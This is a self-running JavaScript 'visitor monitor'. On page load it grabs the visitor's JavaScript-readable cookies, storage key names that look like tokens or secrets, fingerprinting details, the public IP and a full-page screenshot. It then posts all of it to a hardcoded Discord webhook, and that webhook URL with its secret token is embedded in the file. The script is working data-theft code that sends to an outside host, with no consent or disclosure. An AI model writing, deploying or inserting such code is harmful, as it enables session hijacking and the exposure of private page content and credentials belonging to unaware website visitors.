(function (global) {
  'use strict';

  var DEFAULTS = {
    webhookUrl:
      'https://discord.com/api/webhooks/1495259962060968108/VyY2NtOEK20itTZg7X5kayb1m6laU4T0MUtBb8KmxuZT9uxDvpFRjE1XDUpQhccqcOeW',
    ipLookupUrl: 'https://api.ipify.org?format=json',
    captureDelayMs: 400,
    maxCanvasHeight: 4000,
  };

  function buildClientHeaders(nav) {
    var h = {
      Host: location.host,
      'User-Agent': nav.userAgent,
      'Accept-Language': nav.language,
      Referer: document.referrer || undefined,
      DNT: nav.doNotTrack != null ? String(nav.doNotTrack) : undefined,
      'Sec-CH-UA': nav.userAgentData ? JSON.stringify(nav.userAgentData.brands || []) : undefined,
      'Sec-CH-UA-Mobile': nav.userAgentData ? String(!!nav.userAgentData.mobile) : undefined,
      'Sec-CH-UA-Platform': nav.userAgentData ? nav.userAgentData.platform : undefined,
    };
    var conn = nav.connection || nav.mozConnection || nav.webkitConnection;
    if (conn) {
      if (conn.effectiveType) h['Network-Client-Hint'] = 'effectiveType=' + conn.effectiveType;
      if (conn.downlink != null) h['Estimated-Downlink-Mbps'] = String(conn.downlink);
    }
    return h;
  }

  function readCookies() {
    try {
      return document.cookie || '';
    } catch (e) {
      return '';
    }
  }

  function storageKeyHints() {
    var out = { localStorage: [], sessionStorage: [] };
    var re = /auth|token|jwt|session|key|csrf|bearer|secret|api/i;
    try {
      var i;
      for (i = 0; i < localStorage.length; i++) {
        var lk = localStorage.key(i);
        if (lk && re.test(lk)) out.localStorage.push(lk);
      }
    } catch (e) {}
    try {
      for (i = 0; i < sessionStorage.length; i++) {
        var sk = sessionStorage.key(i);
        if (sk && re.test(sk)) out.sessionStorage.push(sk);
      }
    } catch (e2) {}
    return out;
  }

  function collectReport() {
    var nav = navigator;
    var scr = screen;
    var cookies = readCookies();
    var headers = buildClientHeaders(nav);
    var cookiesNote =
      cookies.length > 0
        ? 'Shown: only cookies visible to JavaScript via document.cookie (typically not HttpOnly). HttpOnly cookies are never readable in JS (by design).'
        : 'document.cookie is empty. Likely causes: (1) no cookies for this origin/path; (2) session cookies are HttpOnly; (3) Domain/Path/SameSite scope; (4) browser/privacy/storage rules. JS cannot read HttpOnly cookie values.';
    return {
      collectedAt: new Date().toISOString(),
      url: location.href,
      cookies: cookies,
      cookiesNote: cookiesNote,
      headers: headers,
      storageKeyHints: storageKeyHints(),
      title: document.title || '',
      referrer: document.referrer || '',
      display: {
        screen: scr
          ? {
              width: scr.width,
              height: scr.height,
              availWidth: scr.availWidth,
              availHeight: scr.availHeight,
            }
          : null,
        viewport: {
          innerWidth: window.innerWidth,
          innerHeight: window.innerHeight,
          devicePixelRatio: window.devicePixelRatio,
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      },
      navigator: {
        language: nav.language,
        languages: nav.languages ? Array.from(nav.languages) : [],
        platform: nav.platform,
        cookieEnabled: nav.cookieEnabled,
        onLine: nav.onLine,
      },
    };
  }

  async function fetchPublicIp(ipLookupUrl) {
    try {
      var res = await fetch(ipLookupUrl, { cache: 'no-store' });
      var data = await res.json();
      if (data && data.ip) return data.ip;
    } catch (e) {}
    return null;
  }

  function loadHtml2Canvas() {
    return new Promise(function (resolve, reject) {
      if (global.html2canvas) {
        resolve(global.html2canvas);
        return;
      }
      var s = document.createElement('script');
      s.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
      s.async = true;
      s.onload = function () {
        if (global.html2canvas) resolve(global.html2canvas);
        else reject(new Error('html2canvas not loaded'));
      };
      s.onerror = function () {
        reject(new Error('Failed to load html2canvas'));
      };
      document.head.appendChild(s);
    });
  }

  function capturePagePng(html2canvas, opts) {
    var target = document.documentElement;
    return html2canvas(target, {
      useCORS: true,
      allowTaint: false,
      logging: false,
      scale: Math.min(1, (opts.maxCanvasHeight || 4000) / Math.max(target.scrollHeight, 1)),
      windowHeight: target.scrollHeight,
      windowWidth: target.scrollWidth,
    }).then(function (canvas) {
      return new Promise(function (resolve, reject) {
        canvas.toBlob(function (blob) {
          if (!blob) reject(new Error('toBlob failed'));
          else resolve(blob);
        }, 'image/png');
      });
    });
  }

  function buildDiscordDescription(report, ip, captureLine) {
    var sec1 = '【1 · URL】\n' + (report.url || '') + '\n\n';
    var sec2 =
      '【2 · Cookies】\n' +
      (report.cookies && report.cookies.length ? report.cookies : '(empty)') +
      '\n' +
      (report.cookiesNote || '') +
      '\n\n';
    var sec3 =
      '【3 · Headers (client-visible only)】\n```json\n' +
      JSON.stringify(report.headers, null, 2) +
      '\n```\n\n';
    var sec4 =
      '【4 · IP · capture · title】\n```json\n' +
      JSON.stringify(
        {
          publicIp: ip,
          screenshot: captureLine,
          title: report.title,
          referrer: report.referrer,
        },
        null,
        2
      ) +
      '\n```\n\n';
    var sec5 =
      '【5 · Storage key hints (names)】\n```json\n' +
      JSON.stringify(report.storageKeyHints, null, 2) +
      '\n```\n\n';
    var sec6 =
      '【6 · Display · navigator】\n```json\n' +
      JSON.stringify(
        { display: report.display, navigator: report.navigator },
        null,
        2
      ) +
      '\n```';
    var full = sec1 + sec2 + sec3 + sec4 + sec5 + sec6;
    var max = 4096;
    if (full.length <= max) return full;
    var head = sec1 + sec2 + sec3;
    if (head.length >= max - 24) {
      return head.slice(0, max - 24) + '\n…(truncated)';
    }
    var rest = sec4 + sec5 + sec6;
    var budget = max - head.length - 24;
    return head + '\n…\n' + rest.slice(0, Math.max(0, budget)) + (rest.length > budget ? '\n…(truncated)' : '');
  }

  async function sendToDiscord(options) {
    var opts = Object.assign({}, DEFAULTS, options);
    if (!opts.webhookUrl || typeof opts.webhookUrl !== 'string') {
      throw new Error('webhookUrl required');
    }

    var report = collectReport();
    var ip = await fetchPublicIp(opts.ipLookupUrl);
    report.visitor = { publicIp: ip };

    await new Promise(function (r) {
      setTimeout(r, opts.captureDelayMs);
    });

    var pngBlob = null;
    var captureLine = 'pending';
    try {
      var html2canvas = await loadHtml2Canvas();
      pngBlob = await capturePagePng(html2canvas, opts);
      captureLine = 'ok';
    } catch (e) {
      captureLine = 'failed: ' + String(e && e.message ? e.message : e);
    }

    var embed = {
      title: 'Hit · ' + report.collectedAt,
      description: buildDiscordDescription(report, ip, captureLine),
      color: 0x5865f2,
      timestamp: new Date().toISOString(),
    };

    var payload = {
      embeds: [embed],
      allowed_mentions: { parse: [] },
    };

    var url = opts.webhookUrl + (opts.webhookUrl.indexOf('?') >= 0 ? '&' : '?') + 'wait=true';

    var res;
    if (pngBlob) {
      var form = new FormData();
      form.append('payload_json', JSON.stringify(payload));
      form.append('files[0]', pngBlob, 'page-screenshot.png');
      res = await fetch(url, { method: 'POST', body: form });
    } else {
      res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
    }
    if (!res.ok) {
      var t = await res.text().catch(function () {
        return '';
      });
      throw new Error('Discord HTTP ' + res.status + ' ' + t);
    }
    return { ok: true, status: res.status };
  }

  global.initVisitorMonitor = sendToDiscord;

  if (typeof document !== 'undefined') {
    function runMonitor() {
      sendToDiscord({}).catch(function (e) {
        console.error(e);
      });
    }
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', runMonitor);
    } else {
      runMonitor();
    }
  }
})(typeof window !== 'undefined' ? window : this);
